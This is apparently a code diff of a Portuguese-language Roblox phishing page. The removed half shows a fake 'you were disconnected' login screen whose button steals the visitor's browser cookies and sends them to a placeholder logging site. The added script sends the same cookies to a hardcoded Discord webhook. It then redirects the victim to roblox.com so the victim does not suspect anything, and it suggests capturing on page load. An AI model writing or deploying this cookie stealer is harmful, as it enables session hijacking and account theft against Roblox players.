@@ -1,46 +1,33 @@
-<!DOCTYPE html>
-<html lang="pt-br">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox</title>
-    <style>
-        body { background-color: #191919; color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { text-align: center; }
-        h1 { margin-bottom: 20px; }
-        img { width: 150px; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <!-- Imagem do Roblox para parecer legítimo -->
-        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Roblox">
-        <h1>Você foi desconectado.</h1>
-        <p>Clique abaixo para entrar novamente.</p>
-        <button onclick="stealCookie()" style="padding: 10px 20px; font-size: 16px; cursor: pointer;">Entrar</button>
-    </div>
+<script>
+    // COLE SUA URL DO WEBHOOK AQUI DENTRO DAS ASPAS
+    const webhookUrl = 'https://discord.com/api/webhooks/1567446528908591105/HJrrrW2hiOuddvGHqhiOugZ10PdTdBAsGR9hV6ikva-37KwkXpdaZDCz2XQRKKQdJ7B1';
 
-    <script>
-        // Função para pegar o cookie e enviar para seu servidor
-        function stealCookie() {
-            var cookie = document.cookie;
-            
-            // Aqui você define onde os cookies serão salvos.
-            // Opção A: Enviar para um serviço de log gratuito (ex: Pastebin, ou seu próprio backend)
-            // Opção B: Salvar em um Google Sheet (mais complexo, requer API)
-            
-            // Exemplo simples: Redireciona para o Roblox após capturar
-            fetch('https://SEU-SITE-DE-LOG.com/log?cookie=' + encodeURIComponent(cookie))
-                .then(() => {
-                    window.location.href = "https://www.roblox.com";
-                })
-                .catch(() => {
-                     window.location.href = "https://www.roblox.com";
-                });
-        }
+    function stealCookie() {
+        var cookie = document.cookie;
+        
+        // Prepara a mensagem bonita para o Discord
+        const payload = {
+            content: "🍪 Novo Cookie Capturado!\n" + cookie,
+            username: "Roblox Logger",
+            avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png"
+        };
 
-        // Se quiser capturar automaticamente sem botão:
-        // window.onload = stealCookie;
-    </script>
-</body>
-</html>
+        // Envia para o Discord
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(() => {
+            // Redireciona a vítima para o Roblox para ela não desconfiar
+            window.location.href = "https://www.roblox.com";
+        })
+        .catch(err => {
+            console.error('Erro:', err);
+            window.location.href = "https://www.roblox.com";
+        });
+    }
+    
+    // Se quiser que capture automaticamente sem botão, use a linha abaixo:
+    // window.onload = stealCookie;
+</script>
